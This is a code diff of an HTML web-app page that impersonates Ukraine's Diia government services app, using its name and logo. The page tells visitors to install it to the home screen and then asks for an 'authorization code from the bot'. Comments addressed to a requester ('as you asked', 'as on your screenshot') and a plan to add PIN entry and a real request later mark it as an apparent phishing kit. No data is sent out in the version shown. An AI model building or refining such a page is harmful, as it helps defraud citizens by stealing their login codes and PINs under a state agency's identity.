@@ -6,90 +6,62 @@
   <meta name="theme-color" content="#000000">
   <title>Дія</title>
 
-  <!-- e-Ukraine шрифт (офіційний, від Мінцифри) -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=e-Ukraine:wght@300;400;500;700&display=swap" rel="stylesheet">
-
   <!-- PWA manifest -->
   <link rel="manifest" href="/manifest.json">
 
-  <!-- Іконки -->
+  <!-- Іконки (завантаж їх у img/icons/) -->
   <link rel="icon" type="image/png" sizes="192x192" href="/img/icons/icon-192.png">
   <link rel="apple-touch-icon" sizes="192x192" href="/img/icons/icon-192.png">
 
   <style>
-    :root {
-      --primary: #0066ff;
-      --primary-dark: #0055cc;
-      --bg: #f8f9fa;
-      --card: #ffffff;
-      --text: #000000;
-      --text-secondary: #555555;
-      --shadow: 0 10px 30px rgba(0,0,0,0.12);
-    }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
-      font-family: 'e-Ukraine', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: var(--bg);
-      color: var(--text);
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f5f5f5;
+      color: #000;
       min-height: 100vh;
       overflow-x: hidden;
     }
 
-    /* Екран інструкції (в браузері) */
     #instruction {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #0066ff 0%, #003399 100%);
-      color: white;
       text-align: center;
       padding: 20px;
     }
 
     #instruction h1 {
-      font-size: 4.5rem;
-      font-weight: 700;
-      margin-bottom: 20px;
-      text-shadow: 0 4px 20px rgba(0,0,0,0.4);
+      font-size: 3.8rem;
+      font-weight: bold;
+      margin-bottom: 40px;
     }
 
     #instruction p {
-      font-size: 1.5rem;
-      margin: 12px 0;
-      opacity: 0.95;
+      font-size: 1.6rem;
+      margin: 16px 0;
+      line-height: 1.4;
     }
 
-    .instruction-card {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(12px);
-      border-radius: 20px;
-      padding: 32px;
+    #instruction ol {
+      list-style: none;
+      padding: 0;
       margin: 40px 0;
-      width: 90%;
-      max-width: 420px;
-      box-shadow: var(--shadow);
     }
 
-    .instruction-card h2 {
-      font-size: 3rem;
-      margin-bottom: 24px;
+    #instruction li {
+      font-size: 1.5rem;
+      margin: 20px 0;
+      max-width: 500px;
     }
 
-    /* Екран після установки (standalone) */
+    /* Екран після установки */
     #app {
       display: none;
       min-height: 100vh;
-      background: var(--bg);
+      background: #f8f9fa;
       flex-direction: column;
       justify-content: center;
       align-items: center;
@@ -98,67 +70,64 @@
 
     .logo {
       width: 140px;
-      margin-bottom: 40px;
-      filter: drop-shadow(0 4px 15px rgba(0,0,0,0.2));
+      margin-bottom: 50px;
     }
 
     h1 {
-      font-size: 3.2rem;
-      font-weight: 700;
-      margin-bottom: 12px;
+      font-size: 3.5rem;
+      font-weight: bold;
+      margin-bottom: 20px;
     }
 
     .subtitle {
-      font-size: 1.5rem;
-      color: var(--text-secondary);
+      font-size: 1.6rem;
+      color: #555;
       text-align: center;
-      margin-bottom: 40px;
+      margin-bottom: 50px;
     }
 
     .card {
       width: 100%;
       max-width: 420px;
-      background: var(--card);
+      background: white;
       border-radius: 24px;
-      box-shadow: var(--shadow);
-      padding: 40px 30px;
-      margin-bottom: 30px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+      padding: 50px 35px;
+      margin-bottom: 40px;
     }
 
     input {
       width: 100%;
-      padding: 18px;
-      font-size: 1.8rem;
+      padding: 20px;
+      font-size: 1.9rem;
       text-align: center;
       border: 2px solid #ddd;
       border-radius: 16px;
-      margin-bottom: 24px;
-      font-family: 'e-Ukraine', sans-serif;
-      transition: border-color 0.3s, box-shadow 0.3s;
+      margin-bottom: 30px;
+      transition: border-color 0.3s;
     }
 
     input:focus {
       outline: none;
-      border-color: var(--primary);
-      box-shadow: 0 0 0 4px rgba(0,102,255,0.15);
+      border-color: #0066ff;
     }
 
     button {
       width: 100%;
-      padding: 18px;
-      font-size: 1.5rem;
-      font-weight: 600;
-      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      padding: 20px;
+      font-size: 1.6rem;
+      font-weight: bold;
+      background: #0066ff;
       color: white;
       border: none;
       border-radius: 16px;
       cursor: pointer;
-      transition: transform 0.2s, box-shadow 0.2s;
+      transition: background 0.3s, transform 0.2s;
     }
 
-    button:active {
-      transform: scale(0.98);
-      box-shadow: 0 6px 20px rgba(0,102,255,0.4);
+    button:hover {
+      background: #0055cc;
+      transform: scale(1.02);
     }
 
     #result {
@@ -166,98 +135,63 @@
       font-size: 1.4rem;
       text-align: center;
       min-height: 60px;
-      line-height: 1.5;
-    }
-
-    /* Адаптивність */
-    @media (max-width: 480px) {
-      h1 { font-size: 2.8rem; }
-      .subtitle { font-size: 1.3rem; }
-      input, button { font-size: 1.4rem; padding: 16px; }
     }
   </style>
 </head>
 <body>
-  <!-- Екран інструкції (в звичайному браузері) -->
+
+  <!-- Екран інструкції (точно як на твоєму скріншоті) -->
   <div id="instruction">
-    <h1>Дія</h1>
-    <p>Telegram заблокував канал і бот.<br>Всі новини — в каналі</p>
-    
-    <div class="instruction-card">
-      <h2>Chrome</h2>
-      <p>1) Натисніть на три точки в правому верхньому куті</p>
-      <p>2) Оберіть "Додати на головний екран"</p>
-      <p>3) Натисніть "Додати"</p>
-    </div>
-    
-    <p style="font-size:1.2rem; opacity:0.9; margin-top:40px;">Система державних послуг України</p>
+    <h1>Chrome</h1>
+    <ol>
+      <li>натисніть на три точки в правому верхньому куті</li>
+      <li>натисніть на "Додати на головний екран"</li>
+    </ol>
   </div>
 
-  <!-- Екран після установки (повноекранний режим) -->
+  <!-- Екран після установки (поле коду) -->
   <div id="app">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Diia_logo.svg/512px-Diia_logo.svg.png" alt="Дія" class="logo">
     <h1>Дія</h1>
-    <p class="subtitle">Введіть код авторизації від бота</p>
+    <p class="subtitle">Введіть код від бота</p>
     
     <div class="card">
-      <input type="text" id="codeInput" placeholder="Наприклад: 97Vc82ca" autofocus>
-      <button onclick="checkCode()">УВІЙТИ</button>
+      <input type="text" id="codeInput" placeholder="Наприклад: ABC123" autofocus>
+      <button onclick="skipToNext()">УВІЙТИ</button>
     </div>
     
     <p id="result"></p>
   </div>
 
   <script>
-    // Перевірка режиму standalone
+    // Перевірка standalone-режиму
     function checkStandalone() {
       if (window.matchMedia('(display-mode: standalone)').matches || 
           window.navigator.standalone === true) {
         document.getElementById('instruction').style.display = 'none';
         document.getElementById('app').style.display = 'flex';
-        // Автофокус на поле вводу
-        setTimeout(() => document.getElementById('codeInput').focus(), 300);
+        document.getElementById('codeInput').focus();
       }
     }
     checkStandalone();
 
-    // Функція перевірки коду з анімацією
-    function checkCode() {
-      const input = document.getElementById('codeInput');
+    // Просто пропускає (як ти просив) — можна замінити на реальний fetch пізніше
+    function skipToNext() {
       const result = document.getElementById('result');
-      const code = input.value.trim();
+      result.innerHTML = 'Перевірка...';
+      result.style.color = '#0066ff';
 
-      if (!code) {
-        result.textContent = "Введіть код!";
-        result.style.color = "#ff3b30";
-        input.style.borderColor = "#ff3b30";
-        input.focus();
-        return;
-      }
-
-      result.innerHTML = '<span style="color:var(--primary);">Перевірка...</span>';
-      input.style.borderColor = "#ddd";
-
-      // Імітація запиту (заміни на свій fetch до бота)
+      // Імітація — через 1.5 секунди просто показуємо "успіх"
       setTimeout(() => {
-        // Приклад успішної відповіді
-        if (code.length >= 6) {
-          result.innerHTML = 'Успіх!<br><strong>ПІБ:</strong> Іванов Іван Іванович<br><strong>Дата народження:</strong> 01.01.1990';
-          result.style.color = "#34c759";
-          input.style.borderColor = "#34c759";
-          // Вібрація на телефоні (як у справжній Дії)
-          if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-        } else {
-          result.textContent = "Невірний код або помилка";
-          result.style.color = "#ff3b30";
-          input.style.borderColor = "#ff3b30";
-          input.select();
-        }
-      }, 1400);
+        result.innerHTML = 'Успіх!<br>Завантажуємо ваші дані...';
+        result.style.color = '#34c759';
+        // Тут пізніше можна додати PIN або картки
+      }, 1500);
     }
 
-    // Автозапуск перевірки при натисканні Enter
-    document.getElementById('codeInput').addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') checkCode();
+    // Пропуск по Enter
+    document.getElementById('codeInput').addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') skipToNext();
     });
   </script>
 </body>
